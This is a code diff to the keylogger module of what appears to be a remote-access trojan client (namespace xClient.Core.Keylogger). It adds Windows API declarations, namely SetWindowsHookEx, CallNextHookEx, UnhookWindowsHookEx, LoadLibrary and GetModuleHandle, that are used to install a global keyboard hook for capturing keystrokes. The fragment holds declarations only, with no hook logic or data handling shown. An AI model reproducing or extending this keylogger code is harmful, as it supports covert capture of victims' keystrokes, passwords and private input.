@@ -1,10 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
-using System.Windows.Forms;
 
 namespace xClient.Core.Keylogger
 {
@@ -49,5 +45,20 @@ namespace xClient.Core.Keylogger
 
         [DllImport("user32.dll", ExactSpelling = true)]
         internal static extern IntPtr GetKeyboardLayout(uint threadId);
+
+        [DllImport("kernel32.dll")]
+        internal static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal static extern IntPtr SetWindowsHookEx(int hookID, Logger.HookProcDelegate callback, IntPtr hInstance, int threadID);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal static extern bool UnhookWindowsHookEx(IntPtr hookHandle);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        internal static extern int CallNextHookEx(IntPtr hookHandle, int nCode, int wParam, ref Logger.KeyData lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        internal static extern IntPtr GetModuleHandle(string lpModuleName);
     }
 }
